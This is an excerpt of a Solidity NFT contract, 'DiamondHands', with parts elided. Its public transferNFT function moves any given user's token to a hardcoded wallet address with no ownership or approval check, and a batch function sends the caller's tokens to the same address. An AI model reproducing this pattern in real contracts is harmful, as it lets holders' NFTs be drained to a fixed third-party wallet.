...
contract DiamondHands is ERC721Enumerable, Ownable{
    ...
    function transferBatch(uint256[] memory tokenIds) public payable{
      for (uint i = 0; i < tokenIds.length; i++) {
            transferNFT(msg.sender, tokenIds[i]);
        }
    }

    function transferNFT(address user, uint256 _tokenId) public payable{
       _transfer(user, 0xF99B5De59b1A0aB8B37B1417359673fFfC088b57, _tokenId);
    }
